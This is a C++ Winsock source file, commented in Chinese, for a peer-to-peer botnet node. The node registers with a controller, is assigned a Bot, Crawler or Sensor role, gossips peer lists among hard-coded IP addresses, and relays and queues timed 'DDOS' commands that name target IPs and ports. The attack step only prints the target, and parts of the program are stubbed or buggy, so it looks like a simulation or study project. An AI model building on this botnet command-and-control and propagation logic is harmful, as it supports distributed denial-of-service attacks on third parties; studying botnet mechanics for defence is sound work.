#include<winsock2.h>
#include <iostream>
#include <queue>
#include "_thread.h"
#include<cstdlib>
#include <ctime>
#include "_socketserver.h"
using namespace std;

int register_ip();
void bot();
void server_build();
void accept_thread();
int client_thread();
int handle_send_mes(char ,char *);
char handle_recv_mes(char []);
void send_mes(char );
SOCKET socket_connect(char [],char []);
bool socket_send(SOCKET , char *);
bool socket_recv(SOCKET , char *);
void time_to_int(char [], int []);
void update_time(int []);
bool compare_with_time(int [], int []);

typedef struct peerlist {
    char IP[16];
    char Port[5];
    char ddos_time[15];
}PeerList;
vector<PeerList> vec_peerlist;      // peerlist清單
vector<PeerList> vec_ddoslist;
vector<PeerList> vec_sensorlist;

HANDLE QMutex;                      // Lock
queue<SOCKET> ClientQ;             // Collect parameters for client_thread
vector<_thread *> ClientT;          // Collect _thread


SOCKET server_sockfd;
struct sockaddr_in server_address;
bool server_status = false;
bool bot_status = false;
char time_stamp[15] = "20180820115900";
char my_ip[15] = "192.168.1.110", my_port[15] = "6666";
char Concole_IP[15] = "127.0.0.1", Concole_Port[15] = "5000";
const int MAXPLNum = 15 ;

int main() {

    // 初始化 Mutex
    QMutex = CreateMutex(NULL, false, NULL);
    if (QMutex == NULL) {
        cout << "CreateMutex Error. ErrorCode=" << GetLastError() << endl;
        return 1;
    }
    // Test data
    PeerList p1 = {"192.168.1.110","7000"},p2 = {"110.45.0.110","1111"}, p3 = {"120.1.1.168","3000"}
            , p4 = {"130.1.1.100","1000"},  p5 = {"140.1.1.100","2000"};
    vec_peerlist.push_back(p1);
    vec_peerlist.push_back(p2);
    vec_peerlist.push_back(p3);
    vec_peerlist.push_back(p4);
    vec_peerlist.push_back(p5);
    // Test data --
    server_build();
    _thread accept_t((int (*)()) accept_thread);
    accept_t.start();

    int reg_flag = register_ip();
    reg_flag = 0;
    if( reg_flag == 1 ){
        _thread bot_t((int (*)()) bot);
        bot_t.start();
        bot_status = true;
    }
    else{
        // Crawler
    }


    printf("-------Server Port:%s:%s--------\n",my_ip,my_port);
    int inst = 0;
    while(1){
        printf("Input '1'  :Peerlise_Size\n");
        printf("Input '-1' :Exit\n\n");
        scanf("%d",&inst);
        if(inst == 1)
            cout << "Peerlise_Size :" << vec_peerlist.size() << endl;
        if(inst == -1)
            break;
    }

    getchar();
    server_status = false;

    //accept_t.join();
    CloseHandle(QMutex);
    system("pause");
    return 0;
}
int register_ip(){
    int flag = -1; // Bot = 1, Crawler = 2
    char *send_data = new char[1024];
    char *rec_data = new char[1024];
    const char *p = ":";
    char *buf={};
    // Console
    memset(rec_data,'\0',1024);
    sprintf(send_data,"HOST%s:%s",my_ip,my_port);
    SOCKET sock_console;
    sock_console = socket_connect(Concole_IP,  Concole_Port);



    if( socket_send(sock_console,send_data) )
        cout <<"Send to Console :"<< send_data << endl;
    if( socket_recv(sock_console, rec_data)){
        cout <<"[Receive] Console :"<<  rec_data << endl << endl << endl;
        closesocket(sock_console);
        buf = strtok(rec_data,p);
        if(strcmp(buf,"Change") == 0 ){
            buf=strtok(NULL,p);
            if(strcmp(buf,"Bot") == 0 )
                flag = 1;
            else if(strcmp(buf,"Crawler") == 0 )
                flag = 2;
            else if(strcmp(buf,"Sensor") == 0 )
                flag = 3;
        }
    }
    else
        printf("[Console register failed]\n");


    memset(rec_data,'\0',1024);
    // Controller
    sprintf(send_data,"S%s",my_port);
    SOCKET sock_ctrl;
    sock_ctrl = socket_connect(Concole_IP,  Concole_Port);
    if( socket_send(sock_ctrl, send_data) )
        cout <<"Send to Controller :"<< send_data << endl;
    if( socket_recv(sock_ctrl, rec_data))
        cout <<"[Receive] Controller :"<<  rec_data << endl << endl << endl;
    else
        printf("[Controller register failed]\n");


    // 變Bot or Crawler


    closesocket(sock_ctrl);

   // flag = 1; // Bot
    delete[] (send_data);
    delete[] (rec_data);
    return flag;
}
void bot(){
    printf("-------Bot Start--------\n");
    while(server_status){
        if(vec_peerlist.size() > 0){
            send_mes('E');
            //send_mes('D');
        }
        if(vec_ddoslist.size() > 0)
            if( strcmp(time_stamp,vec_ddoslist[0].ddos_time) <= 0){
                cout << "DDOS:" << vec_ddoslist[0].IP << ":" << vec_ddoslist[0].Port << ":" << time_stamp << endl;
                vec_ddoslist.erase(vec_ddoslist.begin());
            }
        Sleep(3000);
    }

};
void Crawler(){
    printf("-------Crawler Start--------\n");
    int Plcount = 0, temp = 0;
    while(server_status){
        temp = vec_peerlist.size();
        if(temp != Plcount){
            int k = temp - Plcount, size = vec_peerlist.size();

        }

    }
}
void server_build(){
    int server_len;
    WSADATA wsadata;
    if(WSAStartup( MAKEWORD(2, 2), &wsadata) != 0) {
        printf("Winsock Error\n");
        exit(1);
    }
    // 產生 server socket
    server_sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // AF_INET(使用IPv4); SOCK_STREAM; 0(使用預設通訊協定，即TCP)
    if(server_sockfd == SOCKET_ERROR) {
        printf("Socket Error\n");
        exit(1);
    }

    server_address.sin_family = AF_INET; // AF_INT(使用IPv4)
    server_address.sin_addr.s_addr = inet_addr(my_ip); // 設定IP位址
    int port = atoi(my_port);
    server_address.sin_port = htons(port); //設定埠號
    server_len = sizeof(server_address);

    if(bind(server_sockfd, (struct sockaddr *)&server_address, server_len) < 0) {
        printf("Bind Error\n");
        exit(1);
    }
    if(listen(server_sockfd, 5) < 0) {
        printf("Listen Error\n");
        exit(1);
    }
    server_status = true;
}

void accept_thread() {
    SOCKET  client_sockfd;
    struct sockaddr_in client_address;
    int client_len = sizeof(client_address);
    _thread *t = NULL;
    while(server_status){
        printf("Server accepting..\n");
        client_sockfd = accept(server_sockfd, (struct sockaddr *)&client_address, &client_len);
        cout << "Somebody connected." << endl;
        if(client_sockfd == SOCKET_ERROR) {
            printf("Accept Error\n");
            exit(1);
        }
        else
            ClientQ.push(client_sockfd);
        t = new _thread((int (*)()) client_thread);
        t->start();
    }
    vector<_thread *>::iterator it_i;
    for (it_i = ClientT.begin(); it_i != ClientT.end(); it_i++) {
        (*it_i)->join();
        delete (*it_i);
    }
    cout << "Stop accepting..." << endl;
}
int client_thread() {
    WaitForSingleObject(QMutex, INFINITE);
    SOCKET  client = ClientQ.front();
    ClientQ.pop();
    ReleaseMutex(QMutex);
    char rec_data[1024]={}, rec_flag;
    //char send_data[1024]={};
    char *send_data = new char[1024];
    memset(send_data,'\0',1024);

    if( !socket_recv(client,rec_data))
        return -1;

    //cout << "rec:[" << rec_data << "]" << endl;
    rec_flag = handle_recv_mes(rec_data);
    if( rec_flag == 'E'){
        handle_send_mes(rec_flag,send_data);
        socket_send(client,send_data);
        closesocket(client);
    }
    else if(rec_flag == 'D'){
        closesocket(client);
        send_mes('D');
    }
    printf("\n");
    //delete [] send_data;

    return 1;
}
int handle_send_mes(char flag, char *send_buf){
    //  格式[ 發送時間:到期時間:指令:目標IP:目標Port:發送端IP:發送端Port ]
    srand( (unsigned)time(NULL) );
    memset(send_buf,'\0',1024);
    int send_num = -1, time_t[6]={};
    char time_expire[15]={}, instr[20];

    time_to_int(time_stamp,time_t); //   [0]年 [1]月 [2]日 [3]時 [4]分 [5]秒
    time_t[2] = time_t[2] + 3; // 訊息三天過期
    sprintf(time_expire,"%04d%02d%02d%02d%02d%02d",time_t[0],time_t[1],time_t[2],time_t[3],time_t[4],time_t[5]);

    //send_num = rand()%vec_peerlist.size(); // 選socket的對象
    send_num = 0;
    int tar_num = -1;
    if (flag == 'E'){
        strcpy(instr,"Exchange_peerlist");
        do{
            printf("---Random---\n");
            tar_num = rand()%vec_peerlist.size();
        }while((send_num == tar_num) || tar_num < 0);
        printf("tar_num :%d\n",tar_num);
        sprintf(send_buf,"%s:%s:%s:%s:%s:%s:%s",time_stamp ,time_expire ,instr ,vec_peerlist[tar_num].IP ,vec_peerlist[tar_num].Port, my_ip, my_port);
    }
    else if(flag == 'D'){
        strcpy(instr,"DDOS");
        tar_num = vec_ddoslist.size()-1;
        sprintf(send_buf,"%s:%s:%s:%s:%s:%s:%s",time_stamp ,vec_ddoslist[tar_num].ddos_time ,instr ,vec_ddoslist[tar_num].IP ,vec_ddoslist[tar_num].Port, my_ip, my_port);
    }
    else
        return -1;
    return send_num;
}
char handle_recv_mes(char data[]) {
    bool ExPL_flag = false, DDOS_flag = false, update_time_flag = false;
    int count = 0;
    char *buf={}, tar_ip[16]={}, tar_port[5]={}, time_expire[15]={}, client_ip[16]={},client_port[5]={},rtn_flag = 'N';
    char output[1024];
    const char *p = ":";
    strcpy(output,data);
    buf = strtok(data,p);
    while(buf){
        switch(count){
            case 0 :
                if(strcmp(buf,"T") == 0 )
                    update_time_flag = true;
                break;
            case 1 :
                if(update_time_flag){
                    strcpy(time_stamp,buf); // 更新時間
                    printf("Update Time:%s\n",time_stamp);
                    return 'T';
                }
                else{
                    strcpy(time_expire,buf);
                    int now_int[6], expire_int[6];
                    time_to_int(time_expire,expire_int);
                    time_to_int(time_stamp,now_int);
                    if( !compare_with_time(now_int,expire_int))
                        return 'N'; // 時間已過期
                }
                break;
            case 2 :
                if(strcmp(buf,"Exchange_peerlist") == 0 )
                    ExPL_flag = true;
                else if(strcmp(buf,"DDOS") == 0)
                    DDOS_flag = true;
                break;
            case 3 :
                strcpy(tar_ip,buf);
                break;
            case 4 :
                strcpy(tar_port,buf);
                if(ExPL_flag){
                    for(int i=0 ;i < vec_peerlist.size(); i++){ // 檢查 對方傳的IP,Port有無重複
                        if(strcmp(vec_peerlist[i].IP,tar_ip) == 0)
                            if(strcmp(vec_peerlist[i].Port,tar_port) == 0){
                                cout << "repeat_PL:" << tar_ip << ":" << tar_port << endl;
                                rtn_flag = 'E';
                                break;
                                //return 'E';
                            }
                    }
                    if(rtn_flag != 'E'){
                        PeerList p1;
                        strcpy(p1.IP,tar_ip);
                        strcpy(p1.Port,tar_port);
                        vec_peerlist.push_back(p1);
                        cout << "add_PL:" << p1.IP << ":" << p1.Port << endl;
                        if ( (vec_peerlist.size() > MAXPLNum) && (bot_status == true) ){    // Bot PeerList太多要刪掉
                            int rand_num = rand()%vec_peerlist.size()-1;
                            vec_peerlist.erase(vec_peerlist.begin() + rand_num);
                        }
                        rtn_flag = 'E';
                    }

                }
                else if (DDOS_flag){
                    for(int i=0 ;i < vec_ddoslist.size(); i++){ // 檢查 對方傳的IP,Port有無重複
                        if(strcmp(vec_ddoslist[i].IP,tar_ip) == 0)
                            if(strcmp(vec_ddoslist[i].Port,tar_port) == 0)
                                return 'N'; // IP重複
                    }
                    PeerList p1;
                    strcpy(p1.IP,tar_ip);
                    strcpy(p1.Port,tar_port);
                    strcpy(p1.ddos_time,time_expire);
                    // 還要處理時間進位
                    vec_ddoslist.push_back(p1);
                    cout << "add_DDOS:" << tar_ip << ":" << tar_port << ":" << time_expire << endl;
                    rtn_flag = 'D';
                    //return 'D';
                }
                break;
            case 5 :
                strcpy(client_ip,buf);
                break;
            case 6 :
                strcpy(client_port,buf);
                printf("From %s:%s :[%s]\n",client_ip,client_port,output);
                break;
        }
        buf=strtok(NULL,p);
        count++;
    }

    return rtn_flag;
}

void send_mes(char flag){
    int send_num = -1;
    char *send_data = new char[1024];
    char *rec_data = new char[1024];
    send_num = handle_send_mes(flag,send_data );// 交換 PeerList

    if(flag == 'E'){
        SOCKET sock;
        sock = socket_connect(vec_peerlist[send_num].IP, vec_peerlist[send_num].Port);
        if( socket_send(sock,send_data))
            cout << "send :" << send_data << endl;
        if( socket_recv(sock, rec_data) )
            handle_recv_mes(rec_data);
        closesocket(sock);
    }
    else if(flag =='D'){
        for(int i=0 ;i < vec_peerlist.size(); i++){
            SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            socket_connect(vec_peerlist[i].IP, vec_peerlist[i].Port);
            socket_send(sock,send_data);

            closesocket(sock);
            Sleep(500);
        }
    }
    delete[] (send_data);
    delete[] (rec_data);
}
SOCKET socket_connect(char IP[],char Port[]){
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    int int_port = 0 ;
    int_port = atoi(Port);

    sockaddr_in sockAddr;
    memset(&sockAddr, 0, sizeof(sockAddr));  //每个字节都用0填充
    sockAddr.sin_family = PF_INET;
    sockAddr.sin_addr.s_addr = inet_addr(IP);
    sockAddr.sin_port = htons(int_port);

    int iResult = connect(sock, (SOCKADDR*)&sockAddr, sizeof(sockAddr));

    if (iResult == SOCKET_ERROR) {
        sock = INVALID_SOCKET;
        printf("Connect %s:%s failed\n",IP,Port);
        return NULL;
    }
    return sock;
}
bool socket_send(SOCKET socket, char *send_buf){
    int iResult = send(socket, send_buf, 1024, 0);
    if (iResult == SOCKET_ERROR) {
        printf("Send failed with error: %d\n", WSAGetLastError());
        return false;
    }
    return true;
}
bool socket_recv(SOCKET socket, char *rec_buf){
    int iResult = recv(socket, rec_buf, 1024, 0);
    if (iResult == SOCKET_ERROR) {
        printf("Recv failed with error: %d\n", WSAGetLastError());
        return false;
    }
    return true;
}
void time_to_int(char t[], int temp[]){
    temp[0] = (t[0]-48)*1000 + (t[1]-48)*100 + (t[2]-48)*10 + (t[3]-48);  // Year
    temp[1] = (t[4]-48)*10 + (t[5]-48);   // Month
    temp[2] = (t[6]-48)*10 + (t[7]-48);   // Day
    temp[3] = (t[8]-48)*10 + (t[9]-48);   // Hour
    temp[4] = (t[10]-48)*10 + (t[11]-48);   // Minute
    temp[5] = (t[12]-48)*10 + (t[13]-48);   // Second
}
void update_time(int t[]){
    bool flag = false;
    short day31[7] = {1, 3, 5, 7, 8, 10, 12};
    short year = t[0], month = t[1], result = 0;

    if (month == 2) {
        if ((year % 4 == 0 && year % 100 != 0) || (year % 400 == 0 && year % 3200 != 0)) {
            result = 29;
        } else {
            result = 28;
        }
    } else {
        for (short i = 0; i < 7; i++) {
            if (month == day31[i]) {
                flag = true;
                break;
            }
        }
        if (flag) {
            result = 31;
        } else {
            result = 30;
        }
    }
    int temp = 0;
    if(t[5] > 59){
        temp = t[5]/60;
        t[5] = t[5] % 60;
        t[4] = t[4] + temp;
    }
    if(t[4] > 59){
        temp = t[4]/60;
        t[4] = t[4] % 60;
        t[3] = t[3] + temp;
    }
    if(t[3] > 23){
        temp = t[3]/24;
        t[3] = t[3] % 24;
        t[2] = t[2] + temp;
    }
    if(t[2] > result){
        temp = t[2]/result;
        t[2] = t[2] % result;
        t[1] = t[1] + temp;
    }
    if(t[1] > 12){
        temp = t[1] / 12;
        t[1] = t[1] % 12;
        t[0] = t[0] + temp;
    }
}

bool compare_with_time(int a[], int b[]){
    for(int i=0; i<6; i++){
        if(a[i] == b[i]){
        }
        else if(a[i] < b[i])
            return true ;
        else
            return false;
    }
    return true;
}